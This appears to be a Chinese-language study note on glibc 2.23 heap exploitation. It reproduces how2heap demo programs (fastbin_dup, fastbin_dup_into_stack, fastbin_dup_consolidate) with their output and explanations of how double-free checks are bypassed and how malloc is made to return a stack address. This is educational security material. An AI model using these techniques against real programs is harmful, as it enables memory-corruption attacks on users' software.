# How2heap-glibc-2.23

## fastbin_dup

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file demonstrates a simple double-free attack with fastbins.\n");

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	fprintf(stderr, "Freeing the first one...\n");
	free(a);

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
	fprintf(stderr, "1st malloc(8): %p\n", malloc(8));
	fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
	fprintf(stderr, "3rd malloc(8): %p\n", malloc(8));
}
```

result：

```reStructuredText
This file demonstrates a simple double-free attack with fastbins.
Allocating 3 buffers.
1st malloc(8): 00C918B8
2nd malloc(8): 00C918C8
3rd malloc(8): 00C918D8
Freeing the first one...
If we free 00C918B8 again, things will crash because 00C918B8 is at the top of the free list.
So, instead, we'll free 00C918C8.
Now, we can free 00C918B8 again, since it's not the head of the free list.
Now the free list has [ 00C918B8, 00C918C8, 00C918B8 ]. If we malloc 3 times, we'll get 00C918B8 twice!
1st malloc(8): 00C918B8
2nd malloc(8): 00C918C8
3rd malloc(8): 00C918E8
```

analysis：

这里演示了double free漏洞，将一个chunk放入了fast bins中两次。程序会检查链表头的指针是否与即将free的chunk指向同一块内存，如果是就会引发double free错误。但是可以通过在两次free之间free一个其他的chunk达到绕过检测的目的。

## fastbin_dup_into_stack

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file extends on fastbin_dup.c by tricking malloc into\n"
	       "returning a pointer to a controlled location (in this case, the stack).\n");

	unsigned long long stack_var;

	fprintf(stderr, "The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	fprintf(stderr, "Freeing the first one...\n");
	free(a);

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
		"We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
	unsigned long long *d = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", d);
	fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
	fprintf(stderr, "Now the free list has [ %p ].\n", a);
	fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
		"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
		"so that malloc will think there is a free chunk there and agree to\n"
		"return a pointer to it.\n", a);
	stack_var = 0x20;

	fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

	fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
	fprintf(stderr, "4th malloc(8): %p\n", malloc(8));
}
```

result:

```reStructuredText
This file extends on fastbin_dup.c by tricking malloc into
returning a pointer to a controlled location (in this case, the stack).
The address we want malloc() to return is 0x7ffe46d526a0.
Allocating 3 buffers.
1st malloc(8): 0x11a8010
2nd malloc(8): 0x11a8030
3rd malloc(8): 0x11a8050
Freeing the first one...
If we free 0x11a8010 again, things will crash because 0x11a8010 is at the top of the free list.
So, instead, we'll free 0x11a8030.
Now, we can free 0x11a8010 again, since it's not the head of the free list.
Now the free list has [ 0x11a8010, 0x11a8030, 0x11a8010 ]. We'll now carry out our attack by modifying data at 0x11a8010.
1st malloc(8): 0x11a8010
2nd malloc(8): 0x11a8030
Now the free list has [ 0x11a8010 ].
Now, we have access to 0x11a8010 while it remains at the head of the free list.
so now we are writing a fake free size (in this case, 0x20) to the stack,
so that malloc will think there is a free chunk there and agree to
return a pointer to it.
Now, we overwrite the first 8 bytes of the data at 0x11a8010 to point right before the 0x20.
3rd malloc(8): 0x11a8010, putting the stack address on the free list
4th malloc(8): 0x7ffe46d526a0
```

analysis：

申请了a，b，c三块内存，free(a), free(b), free(a), 后fast bin中为a，b，a。这时我再次申请相同大小的内存d，此时a的内存就分配给了d。

我们再次申请内存，将b取出，fast bin中只剩下a。

现在我们通过对d进行修改，使a指向一个fake fast bin。

```c
stack_var = 0x20;//设置fake fast bin的size为0x20，stack_var的位置，fake的size位。
*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));//size的前一个内存单元地址
//使d，即a的fd指针指向fake fast bin。
```

我们再将a取出，如果接着申请大小合适的内存，系统会把fake fast bin给我们。

通过这种方式我们可以获得指向任意地址的指针。

## fastbin_dup_consolidate

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

int main() {
  void* p1 = malloc(0x40);
  void* p2 = malloc(0x40);
  fprintf(stderr, "Allocated two fastbins: p1=%p p2=%p\n", p1, p2);
  fprintf(stderr, "Now free p1!\n");
  free(p1);

  void* p3 = malloc(0x400);
  fprintf(stderr, "Allocated large bin to trigger malloc_consolidate(): p3=%p\n", p3);
  fprintf(stderr, "In malloc_consolidate(), p1 is moved to the unsorted bin.\n");
  free(p1);
  fprintf(stderr, "Trigger the double free vulnerability!\n");
  fprintf(stderr, "We can pass the check in malloc() since p1 is not fast top.\n");
  fprintf(stderr, "Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n", malloc(0x40), malloc(0x40));
}
```

result:

```reStructuredText
Allocated two fastbins: p1=0x220a010 p2=0x220a060
Now free p1!
Allocated large bin to trigger malloc_consolidate(): p3=0x220a0b0
In malloc_consolidate(), p1 is moved to the unsorted bin.
Trigger the double free vulnerability!
We can pass the check in malloc() since p1 is not fast top.
Now p1 is in unsorted bin and fast bin. So we'will get it twice: 0x220a010 0x220a010
```

analysis:

这个实验展示了另一种绕过double free检查机制的方法。

首先申请了两个fast bin，p1和p2，然后free掉p1。如果我们再free一次p1程序肯定会出错。我们先申请一个large bin，p3。

这里根据malloc的分配规则，此时fast bin中可能合并的chunk被放入了unsorted bin进行分配。所以现在p1已经被放入到了small bin中，而fast bin已经没有了chunk，所以再次free(p1)也没有触发错误。最后我们再取出两个与p1大小相同的chunk，一个是从fast bin中，一个是从small bin中。而且这两个chunk是完全相同的。

